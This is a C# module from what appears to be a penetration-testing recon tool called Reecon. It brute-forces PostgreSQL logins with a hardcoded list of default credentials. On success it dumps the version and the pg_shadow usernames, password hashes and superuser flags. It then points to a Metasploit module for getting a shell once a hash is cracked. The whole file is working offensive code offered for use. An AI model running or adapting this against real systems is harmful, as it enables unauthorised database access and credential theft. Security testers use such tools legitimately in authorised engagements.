using Npgsql; // For PostgreSQL Stuff
using System;
using System.Collections.Generic;
using System.Data;

namespace Reecon
{
    class PostgreSQL
    {
        public static (string PortName, string PortData) GetInfo(string target, int port)
        {
            string toReturn = "";
            // Thanks Metasploit!
            List<string> userList = new() { "postgres", "scott", "admin" };
            List<string> passList = new() { "tiger", "postgres", "password", "admin" };
            bool toBreak = false;
            foreach (string username in userList)
            {
                if (toBreak)
                {
                    break;
                }
                foreach (string password in passList)
                {
                    if (toBreak)
                    {
                        break;
                    }
                    using NpgsqlConnection conn = new($"Host={target};Port={port};User Id={username};Password={password};Database=template1;");
                    try
                    {
                        // Try connect
                        conn.Open();
                        // We're connect - Creds are correct!
                        toReturn += "- Login creds found: " + username + ":" + password + Environment.NewLine;
                        toBreak = true;
                        // Pull version info
                        try
                        {
                            NpgsqlCommand cmd = new("SELECT version()", conn);
                            DataSet ds = new();
                            NpgsqlDataAdapter da = new()
                            {
                                SelectCommand = cmd
                            };
                            da.Fill(ds);
                            foreach (DataRow r in ds.Tables[0].Rows)
                            {
                                toReturn += "- Version: " + r["version"].ToString() + Environment.NewLine;
                            }
                        }
                        catch (Exception ex)
                        {
                            toReturn += "- Unable to pull Version info - Bug Reelix: " + ex.Message + Environment.NewLine;
                        }
                        try
                        {
                            NpgsqlCommand cmd = new("SELECT usename, passwd, usesuper FROM pg_shadow", conn);
                            DataSet ds = new();
                            NpgsqlDataAdapter da = new()
                            {
                                SelectCommand = cmd
                            };
                            da.Fill(ds);
                            foreach (DataRow r in ds.Tables[0].Rows)
                            {
                                string dbUser = r["usename"].ToString() ?? "";
                                string dbPass = r["passwd"].ToString() ?? "";
                                bool superUser = bool.Parse(r["usesuper"].ToString() ?? "false");
                                toReturn += "- pg_shadow User: " + dbUser + " - " + dbPass + " - Super User: " + superUser + Environment.NewLine;
                            }
                            toReturn += "-- If a pg_shadow user password is cracked, you can get a shell with: use exploit/multi/postgres/postgres_copy_from_program_cmd_exec";
                        }
                        catch (Exception ex)
                        {
                            toReturn += "- Unable to pull pg_shadow info - Bug Reelix: " + ex.Message + Environment.NewLine;
                        }
                    }
                    catch (Exception ex)
                    {
                        if (ex.Message.Trim().StartsWith("28P01"))
                        {
                            // Invalid Password
                        }
                        else if (ex.Message == "Dependency unixODBC with minimum version 2.3.1 is required")
                        {
                            toReturn += "- Dependency missing. Download from: https://docs.microsoft.com/en-us/sql/connect/odbc/linux-mac/installing-the-microsoft-odbc-driver-for-sql-server?view=sql-server-ver15#ubuntu17";
                            toBreak = true;
                        }
                        else
                        {
                            toReturn += "- Fatal Error in PostgreSQL.GetInfo - Bug Reelix: " + ex.Message;
                            if (ex.InnerException != null)
                            {
                                Console.WriteLine("Inner exception is not null: " + ex.InnerException.Message);
                            }
                            toBreak = true;
                        }
                    }
                }
            }
            if (toReturn == "")
            {
                toReturn = "- Unable to find credentials";
            }
            toReturn = toReturn.Trim(Environment.NewLine.ToCharArray());
            return ("PostgreSQL", toReturn);
        }
    }
}
